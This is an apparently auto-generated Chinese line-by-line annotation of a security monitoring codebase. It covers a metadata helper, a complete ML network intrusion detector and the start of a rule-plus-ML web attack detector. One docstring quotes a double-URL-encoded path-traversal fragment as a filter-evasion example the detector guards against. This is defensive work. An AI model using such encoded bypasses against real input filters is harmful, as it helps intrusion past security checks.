| 10 | 函数定义：声明 `set_inference_meta` 的输入、处理逻辑和返回结果。 | `def set_inference_meta(` |
| 11 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    result: Optional[DetectionResult],` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    engine: str,` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    manifest: Optional[ModelManifest],` |
| 15 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    latency_ms: float,` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_version: Optional[str] = None,` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_version: Optional[str] = None,` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Optional[DetectionResult]:` |
| 19 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    写入 \`\`raw_data['_inference']\`\`：engine、model_version、schema_version、` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    confidence（与 DetectionResult.confidence 一致）、latency_ms。` |
| 22 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 23 | 条件判断：满足条件时进入对应分支。 | `    if result is None:` |
| 24 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mv = (` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `        model_version` |
| 27 | 条件判断：满足条件时进入对应分支。 | `        if model_version is not None` |
| 28 | 兜底分支：处理前面条件都不满足的情况。 | `        else (manifest.version if manifest is not None else "none")` |
| 29 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sv = (` |
| 31 | 代码语句：参与当前文件的业务流程或数据处理。 | `        schema_version` |
| 32 | 条件判断：满足条件时进入对应分支。 | `        if schema_version is not None` |
| 33 | 兜底分支：处理前面条件都不满足的情况。 | `        else (manifest.schema_version if manifest is not None else "")` |
| 34 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    result.raw_data["_inference"] = {` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "engine": engine,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_version": mv,` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_version": sv,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "confidence": float(result.confidence),` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "latency_ms": round(float(latency_ms), 3),` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 42 | 返回结果：把处理后的值交回调用方。 | `    return result` |

## `src/detectors/intrusion_detector.py`

- 类型：检测模型/规则
- 行数：248

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `网络入侵检测引擎` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.4.2 入侵检测` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `须加载 \`\`*.model_manifest.json\`\`；feature_columns 须与磁盘上的` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `intrusion_feature_cols_v1.pkl 完全一致（顺序敏感）。` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `NSL-KDD 原型策略与 DDoS 相同，禁止无清单上线。` |
| 8 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 9 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, List, Optional` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 17 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import (` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    production_tabular_keys_present,` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_payload_against_schema,` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.inference_guard import ml_degraded_normal` |
| 24 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ManifestLoadError, ModelManifest, resolve_model_entry` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.nsl_kdd_adapter import NSLKDDAdapter` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `from .base import BaseDetector, DetectionResult` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `from .inference_meta import set_inference_meta` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 类定义：声明 `IntrusionDetector`，封装相关状态与行为。 | `class IntrusionDetector(BaseDetector):` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `    """网络入侵检测引擎（CNN+LSTM / 随机森林双模式）。"""` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _THREAT_LEVEL_MAP = {` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "dos": "high",` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "probe": "medium",` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "r2l": "high",` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "u2r": "critical",` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _SCALER_FILENAME = "intrusion_scaler_v1.pkl"` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _LABEL_ENCODER_FILENAME = "intrusion_label_encoder_v1.pkl"` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _FEATURE_COLS_FILENAME = "intrusion_feature_cols_v1.pkl"` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, use_deep_learning: bool = False) -> None:` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.use_deep_learning = use_deep_learning` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = None` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.scaler = None` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.label_encoder = None` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.feature_columns: Optional[List[str]] = None` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest: Optional[ModelManifest] = None` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 函数定义：声明 `clear_ml_state` 的输入、处理逻辑和返回结果。 | `    def clear_ml_state(self) -> None:` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = None` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.scaler = None` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.label_encoder = None` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.feature_columns = None` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = None` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 函数定义：声明 `load_model` 的输入、处理逻辑和返回结果。 | `    def load_model(self, model_path: str) -> None:` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.clear_ml_state()` |
| 64 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ap, manifest = resolve_model_entry(model_path)` |
| 66 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ManifestLoadError as exc:` |
| 67 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[AUDIT] Intrusion 模型拒绝加载（manifest 无效）: %s", exc)` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `            raise` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_dir = os.path.dirname(ap)` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 条件判断：满足条件时进入对应分支。 | `        if self.use_deep_learning:` |
| 72 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import tensorflow as tf  # noqa: WPS433` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model = tf.keras.models.load_model(ap)` |
| 75 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[IntrusionDetector] CNN+LSTM 模型加载成功: %s", ap)` |
| 76 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model = joblib.load(ap)` |
| 78 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[IntrusionDetector] 随机森林模型加载成功: %s", ap)` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scaler = joblib.load(os.path.join(model_dir, self._SCALER_FILENAME))` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        label_encoder = joblib.load(` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.path.join(model_dir, self._LABEL_ENCODER_FILENAME)` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        disk_cols: List[str] = joblib.load(` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.path.join(model_dir, self._FEATURE_COLS_FILENAME)` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 87 | 条件判断：满足条件时进入对应分支。 | `        if disk_cols != manifest.feature_columns:` |
| 88 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 89 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "manifest.feature_columns 与 intrusion_feature_cols_v1.pkl 不一致（顺序须完全相同）"` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = model` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.scaler = scaler` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.label_encoder = label_encoder` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.feature_columns = list(manifest.feature_columns)` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = manifest` |
| 96 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[IntrusionDetector] manifest 与配套文件校验通过 trust_tier=%s",` |
| 98 | 代码语句：参与当前文件的业务流程或数据处理。 | `            manifest.trust_tier,` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 102 | 函数定义：声明 `is_ready` 的输入、处理逻辑和返回结果。 | `    def is_ready(self) -> bool:` |
| 103 | 返回结果：把处理后的值交回调用方。 | `        return self.model is not None and self.scaler is not None and self._manifest is not None` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 函数定义：声明 `detect` 的输入、处理逻辑和返回结果。 | `    def detect(self, features: Dict) -> Optional[DetectionResult]:` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 函数定义：声明 `finish` 的输入、处理逻辑和返回结果。 | `        def finish(res: Optional[DetectionResult]) -> Optional[DetectionResult]:` |
| 109 | 返回结果：把处理后的值交回调用方。 | `            return set_inference_meta(` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `                res,` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                engine="IntrusionDetector",` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                manifest=self._manifest,` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                latency_ms=(time.perf_counter() - t0) * 1000.0,` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 条件判断：满足条件时进入对应分支。 | `        if not self.is_ready or self.feature_columns is None or self._manifest is None:` |
| 117 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[IntrusionDetector] 引擎未就绪，返回 None")` |
| 118 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = self._manifest` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(features.get("src_ip", "") or "").strip()` |
| 122 | 条件判断：满足条件时进入对应分支。 | `        if not src_ip:` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            nf = features.get("network_flow_v1")` |
| 124 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(nf, dict):` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_ip = str(nf.get("src_ip", "") or "").strip()` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_schema, schema_errs = validate_payload_against_schema(` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "network_flow_v1", features` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 130 | 条件判断：满足条件时进入对应分支。 | `        if not ok_schema:` |
| 131 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[AUDIT] Intrusion network_flow_v1 契约失败: %s ip=%s",` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `                schema_errs,` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `                src_ip,` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 136 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ml_degraded_normal(` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    engine="IntrusionDetector",` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    reason="network_flow_v1 契约失败: " + "; ".join(schema_errs),` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    extra={"schema_errors": schema_errs},` |
| 142 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 144 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 145 | 条件判断：满足条件时进入对应分支。 | `        if m.trust_tier == "production" and m.adapter is None:` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ok_keys, missing = production_tabular_keys_present(` |
| 147 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.feature_columns, features` |
| 148 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 149 | 条件判断：满足条件时进入对应分支。 | `            if not ok_keys:` |
| 150 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[AUDIT] Intrusion 生产 ML 缺字段: %s ip=%s", missing, src_ip` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 153 | 返回结果：把处理后的值交回调用方。 | `                return finish(` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    ml_degraded_normal(` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        engine="IntrusionDetector",` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        reason="在线特征缺字段: " + ", ".join(missing),` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        source_ip=src_ip,` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        extra={"missing_columns": missing},` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flat: Dict = dict(features)` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            nf = features.get("network_flow_v1")` |
| 163 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(nf, dict):` |
| 164 | 循环：逐个处理集合或迭代器中的元素。 | `                for k, v in nf.items():` |
| 165 | 条件判断：满足条件时进入对应分支。 | `                    if k not in ("schema_name", "schema_version", "schema"):` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        flat.setdefault(k, v)` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            feature_vector = [float(flat[c]) for c in self.feature_columns]` |
| 168 | 条件分支：前面条件不满足时继续判断。 | `        elif m.trust_tier == "prototype_nsl_kdd" and m.adapter == "nsl_kdd_v1":` |
| 169 | 函数调用：执行已有函数/方法完成当前步骤。 | `            vec, audit = NSLKDDAdapter.build_vector_in_order(features, self.feature_columns)` |
| 170 | 条件判断：满足条件时进入对应分支。 | `            if audit.get("zero_filled_columns"):` |
| 171 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 172 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[AUDIT] Intrusion NSL-KDD 原型推理 zero_fill=%s ip=%s",` |
| 173 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    audit["zero_filled_columns"],` |
| 174 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            feature_vector = vec` |
| 177 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 178 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ml_degraded_normal(` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    engine="IntrusionDetector",` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    reason="manifest trust_tier/adapter 不受支持",` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 183 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 185 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = np.array([feature_vector], dtype=np.float32)` |
| 187 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 188 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            X_scaled = self.scaler.transform(X)` |
| 190 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:` |
| 191 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IntrusionDetector] 特征标准化失败: %s", exc)` |
| 192 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 193 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 194 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 195 | 条件判断：满足条件时进入对应分支。 | `            if self.use_deep_learning:` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                X_reshaped = X_scaled.reshape(1, 1, X_scaled.shape[1])` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                probabilities = self.model.predict(X_reshaped, verbose=0)[0]` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                pred_idx = int(np.argmax(probabilities))` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                prediction = self.label_encoder.inverse_transform([pred_idx])[0]` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence = float(probabilities[pred_idx])` |
| 201 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_prediction = self.model.predict(X_scaled)[0]` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                probabilities = self.model.predict_proba(X_scaled)[0]` |
| 204 | 条件判断：满足条件时进入对应分支。 | `                if isinstance(raw_prediction, (int, np.integer)):` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    pred_idx = int(raw_prediction)` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    prediction = self.label_encoder.inverse_transform([pred_idx])[0]` |
| 207 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    prediction = str(raw_prediction)` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    pred_idx = list(self.model.classes_).index(raw_prediction)` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence = float(probabilities[pred_idx])` |
| 211 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:` |
| 212 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IntrusionDetector] 模型推理失败: %s", exc)` |
| 213 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 214 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_data: Dict = {"prediction": str(prediction)}` |
| 216 | 条件判断：满足条件时进入对应分支。 | `        if m.trust_tier == "prototype_nsl_kdd":` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_data["trust_tier"] = m.trust_tier` |
| 218 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 219 | 条件判断：满足条件时进入对应分支。 | `        if str(prediction).lower() == "normal":` |
| 220 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `                DetectionResult(` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_type="normal",` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_level="low",` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    confidence=confidence,` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    details="入侵检测：正常网络行为",` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    raw_data=raw_data,` |
| 228 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 229 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 230 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 231 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level = self._THREAT_LEVEL_MAP.get(str(prediction).lower(), "medium")` |
| 232 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 233 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[IntrusionDetector] 检出入侵 class=%s confidence=%.4f level=%s ip=%s",` |
| 234 | 代码语句：参与当前文件的业务流程或数据处理。 | `            prediction,` |
| 235 | 代码语句：参与当前文件的业务流程或数据处理。 | `            confidence,` |
| 236 | 代码语句：参与当前文件的业务流程或数据处理。 | `            threat_level,` |
| 237 | 代码语句：参与当前文件的业务流程或数据处理。 | `            src_ip,` |
| 238 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 239 | 返回结果：把处理后的值交回调用方。 | `        return finish(` |
| 240 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="intrusion",` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level=threat_level,` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=confidence,` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details=f"入侵检测：类别={prediction}",` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=src_ip,` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data=raw_data,` |
| 247 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 248 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |

## `src/detectors/web_detector.py`

- 类型：检测模型/规则
- 行数：339

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Web 攻击检测引擎（规则引擎 + 机器学习 双重策略）` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.4.3 Web 攻击检测` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `检测策略：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    第一步 规则引擎快速匹配：覆盖 SQL 注入 / XSS / 命令注入 / 路径遍历。` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    第二步 ML 文本分类兜底：规则未命中时调用 TF-IDF + 朴素贝叶斯模型。` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `【安全加固】` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 多层 URL 解码防绕过：对输入 URL 进行至多 5 轮 urllib.parse.unquote，` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `      避免攻击者通过 %252e%252e%2f 等多重编码绕过规则匹配。` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 禁止使用 eval / exec / os.system / subprocess。` |
| 13 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 14 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 17 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 18 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
